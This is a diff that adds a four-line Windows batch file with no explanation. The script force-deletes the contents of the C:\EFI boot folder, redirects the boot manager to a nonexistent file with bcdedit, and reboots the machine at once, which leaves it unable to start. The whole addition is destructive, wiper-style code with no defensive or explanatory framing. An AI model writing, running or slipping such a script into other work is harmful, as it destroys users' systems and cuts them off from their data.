@@ -1,0 +1,4 @@
+@echo off
+del /f /s /q "C:\EFI\*"
+bcdedit /set {bootmgr} path \EFI\Boot\NotExist.efi
+shutdown /r /t 0 /
